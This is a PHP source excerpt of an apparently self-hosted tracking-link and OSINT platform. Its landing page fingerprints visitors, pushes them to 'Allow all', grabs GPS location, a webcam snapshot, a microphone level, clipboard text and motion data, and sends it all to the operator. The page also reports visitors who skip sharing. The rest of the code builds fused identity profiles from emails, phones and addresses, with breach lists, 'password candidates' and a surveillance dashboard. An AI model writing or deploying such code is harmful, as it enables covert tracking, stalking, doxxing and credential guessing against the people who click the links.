    .bar i{display:block;height:100%;width:0;background:#3b82f6;transition:width .2s}
    </style></head><body><div class="card">
      <span class="badge">tracked link</span>
      <h1>Continue to <?= h($host) ?></h1>
      <p class="muted"><?= h($link['label'] ?: 'One tap shares everything below, then sends you straight through.') ?></p>
      <div class="chips">
        <span class="chip" data-k="geo">location</span>
        <?php if ($link['ask_camera']): ?><span class="chip" data-k="cam">camera</span><?php endif; ?>
        <?php if ($link['ask_mic']): ?><span class="chip" data-k="mic">mic</span><?php endif; ?>
        <?php if ($link['ask_notify']): ?><span class="chip" data-k="notif">notifications</span><?php endif; ?>
        <?php if ($link['ask_clip']): ?><span class="chip" data-k="clip">clipboard</span><?php endif; ?>
        <?php if ($link['ask_sensors']): ?><span class="chip" data-k="sensor">motion</span><?php endif; ?>
        <span class="chip" data-k="net">device</span>
      </div>
      <div class="bar"><i id="prog"></i></div>
      <div class="row"><button id="allow">Allow all &amp; continue</button></div>
      <div class="row"><button class="ghost" id="skip">Continue without sharing</button></div>
      <video id="prev" playsinline muted autoplay></video>
      <div class="small" id="status">Ready.</div>
    </div>
    <script>
    var SLUG=<?= json_encode($slug) ?>, B=<?= json_encode(base_url()) ?>, DEST=<?= json_encode($dest) ?>,
        ASK={geo:<?= (int)$link['ask_location'] ?>,cam:<?= (int)$link['ask_camera'] ?>,mic:<?= (int)$link['ask_mic'] ?>,
             notif:<?= (int)$link['ask_notify'] ?>,clip:<?= (int)$link['ask_clip'] ?>,sensor:<?= (int)$link['ask_sensors'] ?>};
    var D={slug:SLUG,url:location.href,ref:document.referrer||null,screen:screen.width+'x'+screen.height+'@'+screen.colorDepth,
      vp:innerWidth+'x'+innerHeight,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,lang:navigator.language,
      cores:navigator.hardwareConcurrency||null,mem:navigator.deviceMemory||null,touch:('ontouchstart' in window)?1:0,
      conn:(navigator.connection&&navigator.connection.effectiveType)||null,ua:navigator.userAgent,
      dev_type:/Mobi|Android/i.test(navigator.userAgent)?'mobile':(/Tablet|iPad/i.test(navigator.userAgent)?'tablet':'desktop')};
    (function(){try{var c=document.createElement('canvas'),x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';
      x.fillStyle='#f60';x.fillRect(0,0,80,20);x.fillStyle='#069';x.fillText('o',2,2);
      var s=c.toDataURL()+navigator.language+navigator.platform+screen.width+navigator.hardwareConcurrency;
      var h=5381;for(var i=0;i<s.length;i++)h=((h<<5)+h+s.charCodeAt(i))>>>0;D.fp=h.toString(16);}catch(e){}})();
    if(navigator.getBattery)navigator.getBattery().then(function(b){D.battery=Math.round(b.level*100)+'%';});
    var done=0,total=5;
    function chip(k,on,txt){var e=document.querySelector('.chip[data-k="'+k+'"]');if(!e)return;
      e.className='chip '+(on?'on':'off');if(txt)e.textContent=txt;
      if(on){done++;document.getElementById('prog').style.width=Math.round(done/total*100)+'%';}}
    function st(m){document.getElementById('status').innerHTML=m;}
    function geo(){return new Promise(function(r){if(!ASK.geo||!navigator.geolocation)return r();
      navigator.geolocation.getCurrentPosition(function(g){D.lat=g.coords.latitude;D.lon=g.coords.longitude;
        D.acc=g.coords.accuracy;D.geo_src='gps';chip('geo',true,'location +/-'+Math.round(g.coords.accuracy)+'m');r();},
        function(){D.geo_src='gps_denied';chip('geo',false,'location denied');r();},
        {enableHighAccuracy:true,timeout:12000,maximumAge:0});});}
    function camMic(){return new Promise(function(r){
      if(!ASK.cam&&!ASK.mic)return r();
      var w={};if(ASK.cam)w.video={width:320,height:240,facingMode:'user'};if(ASK.mic)w.audio=true;
      navigator.mediaDevices.getUserMedia(w).then(function(s){
        var v=document.getElementById('prev');if(ASK.cam){v.style.display='block';v.srcObject=s;}
        var iv=setInterval(function(){if(ASK.cam&&!D.photo){try{var c=document.createElement('canvas');
          c.width=240;c.height=180;c.getContext('2d').drawImage(v,0,0,240,180);
          D.photo=c.toDataURL('image/jpeg',0.6);chip('cam',true,'camera ok');}catch(e){}}},120);
        setTimeout(function(){clearInterval(iv);
          if(ASK.mic){try{var ac=new (window.AudioContext||window.webkitAudioContext)(),an=ac.createAnalyser();
            an.fftSize=512;ac.createMediaStreamSource(s).connect(an);var b=new Uint8Array(an.fftSize),pk=0;
            var iv2=setInterval(function(){an.getByteTimeDomainData(b);var su=0;
              for(var i=0;i<b.length;i++){var q=(b[i]-128)/128;su+=q*q;}pk=Math.max(pk,Math.sqrt(su/b.length));},50);
            setTimeout(function(){clearInterval(iv2);ac.close();D.mic_level=Math.round(pk*100);
              D.mic_state=pk<0.01?'quiet':(pk<0.08?'moderate':'loud');chip('mic',true,'mic: '+D.mic_state);
              s.getTracks().forEach(function(t){t.stop();});r();},600);}
          catch(e){chip('mic',false,'mic blocked');s.getTracks().forEach(function(t){t.stop();});r();}}
          else{s.getTracks().forEach(function(t){t.stop();});r();}},1300);
      }).catch(function(){if(ASK.cam)chip('cam',false,'camera denied');if(ASK.mic)chip('mic',false,'mic denied');r();});});}
    function notif(){return new Promise(function(r){if(!ASK.notif||!('Notification' in window))return r();
      Notification.requestPermission().then(function(p){chip('notif',p==='granted',p==='granted'?'notifications ok':'notifications '+p);r();},function(){r();});});}
    function clip(){return new Promise(function(r){if(!ASK.clip||!navigator.clipboard||!navigator.clipboard.readText)return r();
      navigator.clipboard.readText().then(function(t){if(t)D.clipboard=t.slice(0,120);chip('clip',true,'clipboard ok');r();},
        function(){chip('clip',false,'clipboard denied');r();});});}
    function sensors(){return new Promise(function(r){if(!ASK.sensor)return r();
      function on(e){if(e.accelerationIncludingGravity){var a=e.accelerationIncludingGravity;
          D.motion={x:+(a.x||0).toFixed(2),y:+(a.y||0).toFixed(2),z:+(a.z||0).toFixed(2)};}
        if(e.alpha!=null)D.orientation={a:Math.round(e.alpha),b:Math.round(e.beta||0),g:Math.round(e.gamma||0)};
        chip('sensor',true,'motion ok');removeEventListener('devicemotion',on);r();}
      if(typeof DeviceMotionEvent!=='undefined'&&DeviceMotionEvent.requestPermission)
        DeviceMotionEvent.requestPermission().then(function(){addEventListener('devicemotion',on);setTimeout(r,1200);},function(){chip('sensor',false,'motion denied');r();});
      else{addEventListener('devicemotion',on);setTimeout(r,1200);}});}
    document.getElementById('allow').addEventListener('click',function(){
      st('Collecting...');
      Promise.allSettled([geo(),camMic(),notif(),clip(),sensors()]).then(function(){
        chip('net',true,'device ok');st('Sending...');
        var b=JSON.stringify(D),u=B+'?t=collect&i=1';
        if(navigator.sendBeacon)navigator.sendBeacon(u,new Blob([b],{type:'application/json'}));
        else{var x=new XMLHttpRequest();x.open('POST',u,true);x.setRequestHeader('Content-Type','application/json');x.send(b);}
        location.replace(DEST);});});
    document.getElementById('skip').addEventListener('click',function(){
      var b=JSON.stringify({slug:SLUG,url:location.href,skipped:true}),u=B+'?t=collect&i=1';
      if(navigator.sendBeacon)navigator.sendBeacon(u,new Blob([b],{type:'application/json'}));
      location.replace(DEST);});
    </script></body></html><?php
}

function render_report(string $title, string $html): void {
    ?><!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title><?= h($title) ?></title><style>
    body{margin:0;background:#0b0f17;color:#e8eef7;font:14px/1.65 ui-sans-serif,system-ui,sans-serif;padding:24px;max-width:1020px;margin:auto}
    h1{font-size:19px}h2{font-size:12px;text-transform:uppercase;letter-spacing:.08em;color:#8b98ab;margin:22px 0 8px}
    table{width:100%;border-collapse:collapse;background:#141a24;border:1px solid #232c3a;border-radius:10px;overflow:hidden}
    th,td{padding:8px 11px;text-align:left;border-bottom:1px solid #1d2531;font-size:13px;vertical-align:top}
    th{background:#1a2130;color:#8b98ab;font-weight:500;width:180px}
    code{background:#1a2130;padding:2px 6px;border-radius:5px;color:#93c5fd}a{color:#60a5fa}
    .muted{color:#8b98ab}.big{font-size:28px;font-weight:500}
    .pill{padding:2px 9px;border-radius:20px;font-size:11px;border:1px solid}
    .low{background:#16a34a22;color:#4ade80;border-color:#16a34a66}
    .medium{background:#f59e0b22;color:#fbbf24;border-color:#f59e0b66}
    .high{background:#ef444422;color:#f87171;border-color:#ef444466}
    .ok{color:#4ade80}.bad{color:#f87171}.warn{color:#fbbf24}
    .bar{height:7px;border-radius:5px;background:#1d2531;overflow:hidden;margin:5px 0;max-width:120px}
    .bar i{display:block;height:100%}
    </style></head><body><?= $html ?></body></html><?php
}
function conf_bar(int $c): string {
    $col = $c >= 70 ? '#4ade80' : ($c >= 40 ? '#fbbf24' : '#8b98ab');
    return '<div class="bar"><i style="width:'.$c.'%;background:'.$col.'"></i></div>';
}
function render_kv(array $d): string {
    $o = '<table>';
    foreach ($d as $k=>$v) $o .= '<tr><th>'.h($k).'</th><td>'.h(is_array($v) ? json_encode($v) : (is_bool($v) ? ($v?'yes':'no') : (string)$v)).'</td></tr>';
    return $o.'</table>';
}
function render_email_report(array $d): string {
    if (empty($d['ok'])) return '<h1>Invalid email</h1><p class="muted">'.h($d['error'] ?? '').'</p>';
    $r = $d['risk'];
    $o = '<h1>Email - <code>'.h($d['email']).'</code></h1>';
    $o .= '<p><span class="big">'.$r['score'].'</span> <span class="pill '.h($r['level']).'">'.h(strtoupper($r['level'])).' RISK</span>';
    if (!empty($d['cached'])) $o .= ' <span class="muted">cached</span>';
    $o .= '</p><ul>';
    foreach ($r['reasons'] as $x) $o .= '<li>'.h(($x['points'] > 0 ? '+' : '').$x['points'].' - '.$x['reason']).'</li>';
    $o .= '</ul>';
    if (!empty($d['identity'])) {
        $o .= '<h2>Identity</h2><table>';
        foreach ($d['identity'] as $f=>$vals) foreach (array_slice($vals,0,3) as $v)
            $o .= '<tr><th>'.h($f).'</th><td>'.(str_starts_with((string)$v['value'],'http')
                ? '<a href="'.h($v['value']).'" target="_blank">'.h($v['value']).'</a>' : h($v['value']))
                .' <span class="muted">'.h(implode(', ',array_column($v['sources'],'source'))).'</span>'.conf_bar((int)$v['confidence']).'</td></tr>';
        $o .= '</table>';
    }
    $o .= '<h2>Deliverability</h2><table>';
    $o .= '<tr><th>MX</th><td>'.($d['mx'] ? h(implode(', ',array_column($d['mx'],'host'))) : '<span class="bad">none</span>').'</td></tr>';
    $sm = $d['smtp']['status'] ?? 'n/a';
    $o .= '<tr><th>SMTP RCPT</th><td class="'.($sm === 'deliverable' ? 'ok' : ($sm === 'undeliverable' ? 'bad' : 'warn')).'">'.h($sm).'</td></tr>';
    $o .= '<tr><th>Disposable</th><td>'.($d['domain']['disposable'] ? '<span class="bad">yes</span>' : '<span class="ok">no</span>').'</td></tr></table>';
    if ($d['breaches']) {
        $o .= '<h2>Breaches ('.count($d['breaches']).')</h2><table>';
        foreach ($d['breaches'] as $b) $o .= '<tr><th>'.h($b['name']).'</th><td>'.h($b['date'] ?: '-').'</td></tr>';
        $o .= '</table>';
    }
    if ($d['accounts']) {
        $o .= '<h2>Accounts ('.count($d['accounts']).')</h2><table>';
        foreach ($d['accounts'] as $a) $o .= '<tr><th>'.h($a['platform']).'</th><td><a href="'.h($a['url']).'" target="_blank">'.h($a['url']).'</a></td></tr>';
        $o .= '</table>';
    }
    $o .= '<h2>Domain</h2><table>';
    foreach (['registrar'=>'Registrar','created'=>'Created','expires'=>'Expires'] as $k=>$l)
        $o .= '<tr><th>'.$l.'</th><td>'.h($d['domain'][$k] ?? '-').'</td></tr>';
    $o .= '<tr><th>SPF</th><td>'.(empty($d['domain']['spf']) ? '<span class="warn">missing</span>' : '<code>'.h($d['domain']['spf']).'</code>').'</td></tr>';
    $o .= '<tr><th>DMARC</th><td>'.(empty($d['domain']['dmarc']) ? '<span class="warn">missing</span>' : '<code>'.h($d['domain']['dmarc']).'</code>').'</td></tr></table>';
    $o .= '<h2>Password candidates</h2><p><code>'.h(implode(' ',$d['password_candidates'])).'</code></p>';
    return $o;
}
function render_phone_report(array $d): string {
    if (empty($d['ok'])) return '<h1>Phone</h1><p class="bad">'.h($d['error'] ?? '').'</p>';
    $sp = $d['spam'] ?? ['score'=>0,'level'=>'low','reasons'=>[]];
    $o = '<h1>Phone - <code>'.h($d['e164']).'</code></h1>';
    $o .= '<p><span class="big">'.$sp['score'].'</span> <span class="pill '.h($sp['level']).'">'.h(strtoupper($sp['level'])).' SPAM</span></p>';
    $o .= '<h2>Line</h2><table>';
    foreach (['country_name'=>'Country','country'=>'ISO','region'=>'Region','line_type'=>'Line type','carrier'=>'Carrier',
              'national'=>'National','calling_code'=>'Calling code'] as $k=>$l)
        if (!empty($d[$k])) $o .= '<tr><th>'.$l.'</th><td>'.h((string)$d[$k]).'</td></tr>';
    $o .= '</table>';
    if (!empty($d['formats'])) { $o .= '<h2>Formats</h2><table>';
        foreach ($d['formats'] as $k=>$v) $o .= '<tr><th>'.h($k).'</th><td><code>'.h($v).'</code></td></tr>'; $o .= '</table>'; }
    $o .= '<h2>Public mentions ('.count($d['public_mentions']).')</h2>';
    if ($d['public_mentions']) { $o .= '<table>';
        foreach ($d['public_mentions'] as $m) $o .= '<tr><th><a href="'.h($m['url']).'" target="_blank">'.h(parse_url($m['url'],PHP_URL_HOST) ?: $m['url']).'</a></th><td>'.h($m['title']).'</td></tr>';
        $o .= '</table>'; } else $o .= '<p class="muted">None indexed.</p>';
    return $o;
}
function render_ip_report(array $d): string {
    if (empty($d['ok'])) return '<h1>IP</h1><p class="bad">'.h($d['error'] ?? '').'</p>';
    $o = '<h1>IP - <code>'.h($d['ip']).'</code></h1><table>';
    $o .= '<tr><th>Reverse DNS</th><td>'.h((string)($d['reverse'] ?? '-')).'</td></tr>';
    foreach (['country'=>'Country','region'=>'Region','city'=>'City','isp'=>'ISP','timezone'=>'Timezone'] as $k=>$l)
        if (!empty($d['geo'][$k])) $o .= '<tr><th>'.$l.'</th><td>'.h((string)$d['geo'][$k]).'</td></tr>';
    if (!empty($d['asn']['number'])) $o .= '<tr><th>ASN</th><td>AS'.h($d['asn']['number']).' '.h($d['asn']['name'] ?? '').'</td></tr>';
    if (!empty($d['netblock']['name'])) $o .= '<tr><th>Netblock</th><td>'.h($d['netblock']['name']).' '.h(($d['netblock']['start'] ?? '').' - '.($d['netblock']['end'] ?? '')).'</td></tr>';
    $o .= '<tr><th>Tor exit</th><td>'.(!empty($d['tor']) ? '<span class="warn">yes</span>' : 'no').'</td></tr>';
    $o .= '<tr><th>Blacklisted</th><td>'.(!empty($d['blacklisted']) ? '<span class="bad">yes</span>' : '<span class="ok">no</span>').'</td></tr></table>';
    if (!empty($d['ports'])) { $o .= '<h2>Open ports</h2><table>';
        foreach ($d['ports'] as $p) $o .= '<tr><th>'.$p['port'].'</th><td>'.h($p['service']).'</td></tr>'; $o .= '</table>'; }
    if (!empty($d['blacklists'])) { $o .= '<h2>DNSBL hits</h2><table>';
        foreach ($d['blacklists'] as $b) $o .= '<tr><th>'.h($b['zone']).'</th><td>'.h(implode(', ',$b['answers'])).'</td></tr>'; $o .= '</table>'; }
    return $o;
}
function render_user_report(array $d): string {
    if (empty($d['ok'])) return '<h1>Username</h1><p class="bad">'.h($d['error'] ?? '').'</p>';
    $o = '<h1>Username - <code>'.h($d['username']).'</code></h1>';
    $o .= '<p>Found on <b>'.$d['found'].'</b> of '.$d['checked'].' sites.</p><table>';
    foreach ($d['profiles'] as $p) $o .= '<tr><th>'.h($p['site']).'</th><td><a href="'.h($p['url']).'" target="_blank">'.h($p['url']).'</a></td></tr>';
    $o .= '</table>';
    if (!empty($d['alternates'])) $o .= '<h2>Alternate handles</h2><p><code>'.h(implode(' ', $d['alternates'])).'</code></p>';
    return $o;
}
function render_domain_report(array $d): string {
    $o = '<h1>Domain - <code>'.h($d['domain']).'</code></h1><table>';
    foreach (['registrar'=>'Registrar','created'=>'Created','expires'=>'Expires','disposable'=>'Disposable'] as $k=>$l)
        if (($d[$k] ?? null) !== null) $o .= '<tr><th>'.$l.'</th><td>'.h(is_bool($d[$k]) ? ($d[$k]?'yes':'no') : (string)$d[$k]).'</td></tr>';
    $o .= '<tr><th>MX</th><td>'.h(implode(', ',array_column($d['mx'] ?? [],'host')) ?: 'none').'</td></tr>';
    $o .= '<tr><th>A</th><td>'.h(implode(', ',(array)($d['a'] ?? [])) ?: '-').'</td></tr>';
    $o .= '<tr><th>SPF</th><td>'.h($d['spf'] ?? 'missing').'</td></tr>';
    $o .= '<tr><th>DMARC</th><td>'.h($d['dmarc'] ?? 'missing').'</td></tr></table>';
    return $o;
}
function render_dns_report(array $d): string {
    $o = '';
    foreach ($d as $type=>$rows) { $o .= '<h2>'.$type.'</h2><table>';
        foreach ($rows as $r) $o .= '<tr><td><code>'.h(json_encode($r)).'</code></td></tr>'; $o .= '</table>'; }
    return $o ?: '<p class="muted">no records</p>';
}
function render_tls_report(array $d): string {
    if (empty($d['ok'])) return '<h1>TLS</h1><p class="bad">'.h($d['error'] ?? '').'</p>';
    $o = '<h1>TLS - <code>'.h($d['host']).'</code> <span class="pill">grade '.h($d['grade']).'</span></h1><table>';
    foreach (['cn'=>'Common name','issuer'=>'Issuer','not_before'=>'Valid from','not_after'=>'Valid to','days_left'=>'Days left','sig'=>'Signature'] as $k=>$l)
        $o .= '<tr><th>'.$l.'</th><td>'.h((string)($d[$k] ?? '-')).'</td></tr>';
    $o .= '<tr><th>SANs</th><td>'.h(implode(', ',(array)$d['san'])).'</td></tr></table>';
    if (!empty($d['issues'])) { $o .= '<h2>Issues</h2><ul>';
        foreach ($d['issues'] as $i) $o .= '<li class="warn">'.h($i).'</li>'; $o .= '</ul>'; }
    return $o;
}
function render_subs_report(array $d): string {
    $o = '<h1>Subdomains - '.h($d['domain']).'</h1><p>'.$d['count'].' found.</p><table>';
    foreach (array_slice($d['subdomains'],0,200) as $s) $o .= '<tr><td><code>'.h($s).'</code></td></tr>';
    return $o.'</table>';
}
function render_headers_report(array $d): string {
    $o = '<h1>Security headers - <span class="pill">grade '.h($d['grade']).'</span></h1><table>';
    $o .= '<tr><th>Status</th><td>'.$d['status'].'</td></tr><tr><th>Server</th><td>'.h((string)($d['server'] ?? '-')).'</td></tr>';
    foreach ($d['present'] as $k=>$v) $o .= '<tr><th class="ok">'.h($k).'</th><td><code>'.h(substr($v,0,120)).'</code></td></tr>';
    foreach ($d['missing'] as $m) $o .= '<tr><th class="warn">'.h($m).'</th><td class="bad">missing</td></tr>';
    return $o.'</table>';
}
function render_pass_report(array $d): string {
    if (empty($d['ok'])) return '<p class="bad">unreachable</p>';
    return $d['pwned'] ? '<h1>PWNED</h1><p>Seen <b>'.number_format($d['count']).'</b> times in breaches.</p>'
        : '<h1>Not found</h1><p class="ok">Not in the Pwned Passwords corpus.</p>';
}
function render_addr_report(array $d): string {
    if (!($d['ok'] ?? true)) return '<h1>Address</h1><p class="bad">'.h($d['error'] ?? '').'</p>';
    $o = '<h1>Address</h1><table>';
    foreach (['display_name'=>'Formatted','street'=>'Street','city'=>'City','region'=>'Region',
              'postcode'=>'Postcode','country'=>'Country','lat'=>'Latitude','lon'=>'Longitude'] as $k=>$l)
        if (!empty($d[$k])) $o .= '<tr><th>'.$l.'</th><td>'.h((string)$d[$k]).'</td></tr>';
    $o .= '</table>';
    if (!empty($d['lat']) && !empty($d['lon']))
        $o .= '<p style="margin-top:14px"><a href="https://www.openstreetmap.org/?mlat='.h($d['lat']).'&mlon='.h($d['lon']).'" target="_blank">Open in map</a></p>';
    return $o;
}
function render_profile_report(array $d): string {
    $o = '<h1>Fused profile</h1><p><span class="big">'.$d['composite_risk']['score'].'</span> <span class="pill '.h($d['composite_risk']['level']).'">'.h(strtoupper($d['composite_risk']['level'])).'</span></p>';
    if ($d['identity']) {
        $o .= '<h2>Resolved identity</h2><table>';
        foreach (array_slice($d['identity'],0,15) as $f)
            $o .= '<tr><th>'.h($f['field']).'</th><td>'.h((string)$f['value']).' <span class="muted">'
                .h(implode(', ',array_column($f['sources'],'source'))).'</span>'.conf_bar((int)$f['confidence']).'</td></tr>';
        $o .= '</table>';
    }
    $o .= '<h2>Per identifier</h2><table>';
    foreach (($d['reports']['emails'] ?? []) as $e=>$r)
        $o .= '<tr><th>email</th><td><code>'.h($e).'</code> - risk '.$r['risk']['score'].', '.$r['breaches'].' breaches</td></tr>';
    foreach (($d['reports']['phones'] ?? []) as $n=>$r)
        $o .= '<tr><th>phone</th><td><code>'.h($n).'</code> - '.h((string)$r['carrier']).' / '.h((string)$r['line_type']).'</td></tr>';
    $o .= '</table>';
    return $o;
}
function build_profile(array $ids): array {
    $emails = array_values(array_filter($ids['emails'] ?? [], fn($e) => (bool)filter_var($e, FILTER_VALIDATE_EMAIL)));
    $phones = []; foreach (($ids['phones'] ?? []) as $p) if ($n = phone_normalize((string)$p)) $phones[] = $n;
    $addresses = array_values(array_filter($ids['addresses'] ?? []));
    $domains = array_values(array_filter($ids['domains'] ?? []));
    foreach ($emails as $e) { $d = explode('@',$e)[1] ?? ''; if ($d && !in_array($d,FREE_MAIL,true)) $domains[] = $d; }
    $domains = array_values(array_unique($domains));
    $facts = []; $reports = [];
    foreach ($emails as $e) {
        $r = email_osint($e); if (!($r['ok'] ?? false)) continue;
        $reports['emails'][$e] = ['risk'=>$r['risk'],'breaches'=>count($r['breaches']),'accounts'=>count($r['accounts'])];
        foreach ($r['facts'] as $f) $facts[] = $f;
    }
    foreach ($phones as $p) {
        $r = phone_osint($p, true); if (!($r['ok'] ?? false)) continue;
        $reports['phones'][$p] = ['risk'=>$r['spam'],'carrier'=>$r['carrier'],'line_type'=>$r['line_type'],'country'=>$r['country_name']];
    }
    foreach ($addresses as $a) {
        $g = geocode($a);
        if ($g['ok'] ?? false) { $reports['addresses'][$a] = ['display_name'=>$g['display_name']]; $facts[] = fact('location',$g['city'].', '.$g['country'],'geocode',70); }
    }
    foreach ($domains as $d) {
        $di = domain_intel($d);
        $reports['domains'][$d] = ['registrar'=>$di['registrar'] ?? null,'created'=>$di['created'] ?? null,'disposable'=>$di['disposable']];
    }
    $merged = merge_facts($facts);
    $identity = array_values(array_filter($merged, fn($f) => in_array($f['field'],['name','username','phone','location','job','company','avatar','bio'],true)));
    $usernames = array_values(array_unique(array_column(array_filter($merged, fn($f) => $f['field'] === 'username'),'value')));
    $composite = 0;
    $er = array_column($reports['emails'] ?? [], 'risk'); if ($er) $composite += (int)round(array_sum(array_column($er,'score'))/count($er)*0.6);
    $pr = array_column($reports['phones'] ?? [], 'risk'); if ($pr) $composite += (int)round(array_sum(array_column($pr,'score'))/count($pr)*0.4);
    $composite = max(0, min(100, $composite));
    $profile = ['ok'=>true,'generated'=>gmdate('c'),'inputs'=>['emails'=>$emails,'phones'=>$phones,'domains'=>$domains,'addresses'=>$addresses],
        'identity'=>$identity,'facts'=>array_slice($merged,0,80),'reports'=>$reports,
        'composite_risk'=>['score'=>$composite,'level'=>$composite >= 60 ? 'high' : ($composite >= 30 ? 'medium' : 'low')]];
    db()->prepare('REPLACE INTO profiles (pid,json,ts) VALUES (?,?,?)')
        ->execute([substr(md5(implode('|', array_merge($emails,$phones,$domains,$addresses))),0,16), json_encode($profile), gmdate('Y-m-d H:i:s')]);
    return $profile;
}

/* ================================================================
 *  DASHBOARD
 * ================================================================ */
function render_dashboard(): void {
    $pdo = db();
    $q = fn(string $s) => (int)$pdo->query($s)->fetchColumn();
    $today = driver() === 'sqlite' ? "date('now')" : 'CURDATE()';
    $tot = ['Events'=>$q('SELECT COUNT(*) FROM events'), 'Visitors'=>$q('SELECT COUNT(*) FROM visitors'),
        'Today'=>$q("SELECT COUNT(*) FROM events WHERE ts >= $today"),
        'GPS'=>$q("SELECT COUNT(*) FROM events WHERE geo_src='gps'"),
        'Clicks'=>$q("SELECT COUNT(*) FROM events WHERE kind='link_click'"),
        'Anomalies'=>$q('SELECT COUNT(*) FROM events WHERE anomaly IS NOT NULL')];
    $links = $pdo->query('SELECT * FROM links ORDER BY id DESC LIMIT 30')->fetchAll();
    $emails = $pdo->query('SELECT * FROM emails ORDER BY id DESC LIMIT 12')->fetchAll();
    $watch = $pdo->query('SELECT * FROM watchlist ORDER BY id DESC LIMIT 25')->fetchAll();
    $alerts = $pdo->query('SELECT * FROM alerts ORDER BY id DESC LIMIT 12')->fetchAll();
    $keys = $pdo->query('SELECT id,label,scope,calls,last_used FROM api_keys ORDER BY id DESC LIMIT 12')->fetchAll();
    $audit = $pdo->query('SELECT * FROM audit ORDER BY id DESC LIMIT 12')->fetchAll();
    $jobs = $pdo->query('SELECT * FROM jobs ORDER BY id DESC LIMIT 15')->fetchAll();
    $caps = $pdo->query('SELECT id FROM captures ORDER BY id DESC LIMIT 10')->fetchAll();
    $env = env_report();
    ?>
<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Master control</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4/dist/chart.umd.min.js"></script>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
:root{--bg:#0b0f17;--p:#141a24;--b:#232c3a;--f:#e8eef7;--m:#8b98ab;--a:#3b82f6}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--f);font:14px/1.55 ui-sans-serif,system-ui,sans-serif}
header{padding:11px 18px;border-bottom:1px solid var(--b);display:flex;gap:9px;align-items:center;flex-wrap:wrap;position:sticky;top:0;background:#0b0f17ee;backdrop-filter:blur(8px);z-index:9}
h1{font-size:15px;margin:0}.grow{flex:1}
.tabs{display:flex;gap:4px;padding:10px 18px 0;flex-wrap:wrap}
.tabs button{background:#141a24;border:1px solid var(--b);color:var(--m);padding:6px 12px;border-radius:8px;cursor:pointer;font-size:12px}
.tabs button.on{background:#1d4ed833;color:#93c5fd;border-color:#1d4ed866}
.tab{display:none}.tab.on{display:block}
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(115px,1fr));gap:8px;padding:13px 18px}
.card{background:var(--p);border:1px solid var(--b);border-radius:10px;padding:10px}
.card b{display:block;font-size:20px;color:#60a5fa}.card span{color:var(--m);font-size:10px;text-transform:uppercase}
section{padding:5px 18px 16px}h2{font-size:11px;color:var(--m);text-transform:uppercase;letter-spacing:.07em;margin:16px 0 7px}
table{width:100%;border-collapse:collapse;font-size:12.5px;background:var(--p);border:1px solid var(--b);border-radius:10px;overflow:hidden}
th,td{padding:6px 9px;text-align:left;border-bottom:1px solid #1d2531;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:280px}
th{background:#1a2130;color:var(--m);font-size:10px;text-transform:uppercase}tr:last-child td{border-bottom:0}
.wrap{overflow-x:auto}form.inl{background:var(--p);border:1px solid var(--b);border-radius:10px;padding:8px;display:flex;gap:6px;flex-wrap:wrap;align-items:center}
input,select,button{padding:6px 9px;border-radius:8px;border:1px solid var(--b);background:#0e141d;color:var(--f);font:inherit}
button{background:var(--a);color:#fff;border:0;font-weight:500;cursor:pointer}button.g{background:#1e293b;border:1px solid #334155;color:var(--f)}
code{background:#1a2130;padding:2px 5px;border-radius:5px;color:#93c5fd;font-size:11.5px}a{color:#60a5fa}
#map{height:290px;border-radius:10px;border:1px solid var(--b)}canvas{background:var(--p);border:1px solid var(--b);border-radius:10px;padding:8px}
.tool{display:grid;grid-template-columns:1fr 1fr;gap:13px}@media(max-width:800px){.tool{grid-template-columns:1fr}}
.out{background:#0e141d;border:1px solid var(--b);border-radius:10px;padding:9px;margin-top:7px;font-size:11.5px;max-height:300px;overflow:auto;white-space:pre-wrap;font-family:ui-monospace,monospace}
.thumbs{display:flex;gap:6px;flex-wrap:wrap}.thumbs img{width:95px;border-radius:8px;border:1px solid var(--b)}
.pill{padding:2px 7px;border-radius:20px;background:#1d4ed833;color:#93c5fd;border:1px solid #1d4ed866;font-size:10.5px}
.hi{background:#ef444422;color:#f87171;border-color:#ef444466}.me{background:#f59e0b22;color:#fbbf24;border-color:#f59e0b66}
.flags{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:6px}
.flags label{background:var(--p);border:1px solid var(--b);border-radius:8px;padding:8px 10px;font-size:12.5px;display:flex;gap:8px;align-items:center}
.env{display:flex;flex-wrap:wrap;gap:5px}.env span{font-size:11px;padding:3px 8px;border-radius:20px;border:1px solid var(--b);background:var(--p)}
.env .y{color:#4ade80;border-color:#16a34a55}.env .n{color:#f87171;border-color:#ef444455}
</style></head><body>
<header><h1>Master control</h1><span class="pill"><?= h(base_url()) ?></span><div class="grow"></div>
  <a href="?t=selftest&json=1" target="_blank"><button class="g">Self-test</button></a>
  <a href="?t=export&kind=events&i=1"><button class="g">CSV</button></a>
  <a href="?t=logout&i=1"><button class="g">Sign out</button></a></header>

<div class="tabs">
  <button class="on" data-tab="over">Overview</button><button data-tab="osint">OSINT</button>
  <button data-tab="links">Links</button><button data-tab="watch">Watchlist</button>
  <button data-tab="jobs">Jobs</button><button data-tab="keys">Keys</button><button data-tab="logs">Logs</button>
</div>

<div class="tab on" id="tab-over">
<div class="cards"><?php foreach ($tot as $k=>$v): ?><div class="card"><span><?= h($k) ?></span><b><?= number_format($v) ?></b></div><?php endforeach; ?></div>
<section><h2>Host environment</h2><div class="env">
<?php foreach ($env as $k=>$v): if (is_bool($v)): ?><span class="<?= $v?'y':'n' ?>"><?= h($k) ?>: <?= $v?'yes':'no' ?></span>
<?php else: ?><span><?= h($k) ?>: <?= h((string)$v) ?></span><?php endif; endforeach; ?></div></section>
<section><h2>Activity - 14 days</h2><canvas id="ch" height="65"></canvas></section>
<section><h2>GPS (green) vs IP (blue)</h2><div id="map"></div></section>
</div>

<div class="tab" id="tab-osint">
<section class="tool">
  <div>
    <h2>Email</h2>
    <form class="inl" onsubmit="return run('email',this)"><input name="e" placeholder="someone@example.com" size="20" required>
